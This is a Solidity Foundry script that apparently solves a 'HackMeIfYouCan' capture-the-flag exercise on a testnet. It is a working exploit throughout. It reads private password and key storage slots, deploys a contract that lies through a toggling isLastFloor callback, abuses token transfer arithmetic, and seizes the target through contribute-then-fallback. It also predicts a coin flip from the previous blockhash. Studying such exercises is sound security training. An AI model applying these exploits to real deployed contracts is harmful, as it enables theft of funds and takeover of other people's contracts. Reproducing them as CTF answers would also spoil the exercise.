// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract Interfaced {
    bytes32[15] public data;
    bool toggle = true;
    HackMeIfYouCan public hackMeIfYouCan = new HackMeIfYouCan(bytes32("abc"), data);

    function isLastFloor(uint256) external returns (bool){
        console.log("Toggle",toggle);
        toggle = !toggle;
        return toggle;
    }

    function attack() public returns (bool){
        hackMeIfYouCan.goTo(1);
        return hackMeIfYouCan.top(0x81C9A3b742E42E4513dAED893108F17E3430bf84);
    }
    
}

contract SyncBlock {
    HackMeIfYouCan public hackMeIfYouCan;
    uint256 FACTOR =
        6275657625726723324896521676682367236752985978263786257989175917;
    function tricheur() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipVal = blockValue / FACTOR;
        bool side = coinFlipVal == 1 ? true : false;
        hackMeIfYouCan = HackMeIfYouCan(payable(0xAf32e1287cc1d80635E6Fd39E969E79F5d519e16));
        return hackMeIfYouCan.flip(side);
    }
}


contract HackMeIfYouCanSript is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    Interfaced public interfaced;
    SyncBlock public syncBlock;

    bytes32[15] public data;
    bytes32 public value;

    // Récupération de l'id de la chain
    function getChainId() public view returns (uint256) {
        uint256 id;
        assembly {
            id := chainid()
        }
        return id;
    }

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        if (getChainId() != 43113) {
            hackMeIfYouCan = new HackMeIfYouCan(bytes32("abc"), data);
        } else {
            hackMeIfYouCan = HackMeIfYouCan(payable(0xAf32e1287cc1d80635E6Fd39E969E79F5d519e16));
        }

        //PASSWORD
        console.log("****EXO: PASSWORD**** VALIDE");
        bytes32 value = vm.load(address(hackMeIfYouCan), bytes32(uint256(3)));
        //console.logBytes32(value);
        hackMeIfYouCan.sendPassword(value);

        //KEY
        console.log("****EXO: KEY**** VALIDE");
        bytes32 keyValue = vm.load(address(hackMeIfYouCan), bytes32(uint256(16)));
        console.logBytes32(keyValue);
        hackMeIfYouCan.sendKey(bytes16(keyValue));


        //FLOOR
        // console.log("****EXO: FLOOR****");
        // interfaced = new Interfaced();
        // console.log("Is Last Floor: ", interfaced.attack());
        // console.log("UserFloor",hackMeIfYouCan.userFloor(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38));

        //TRANSFER
        console.log("****EXO: TRANSFER**** VALIDE");
        console.log("Old balance: ", address(this).balance);
        console.log("Contract: ", address(hackMeIfYouCan));
        hackMeIfYouCan.transfer(address(0), 21);
        console.log("New balance: ", hackMeIfYouCan.balanceOf(msg.sender));

        //FALLBACK
        console.log("****EXO: FALLBACK**** VALIDE");
        hackMeIfYouCan.contribute{value: 0.0001 ether}();
        require(hackMeIfYouCan.getContribution() > 0, "Contribution failed");
        ( bool success, ) = payable(hackMeIfYouCan).call{value: 0.0011 ether}("");

        //FLIP
        console.log("****EXO: FLIP****");
        syncBlock = new SyncBlock();
        console.log("CoinFlip predict1: ", syncBlock.tricheur());
        console.log("CONSECUTIVE",hackMeIfYouCan.consecutiveWins(0x81C9A3b742E42E4513dAED893108F17E3430bf84));


        console.log("Marks",hackMeIfYouCan.marks(0x81C9A3b742E42E4513dAED893108F17E3430bf84));

        

        vm.stopBroadcast();
    }
}
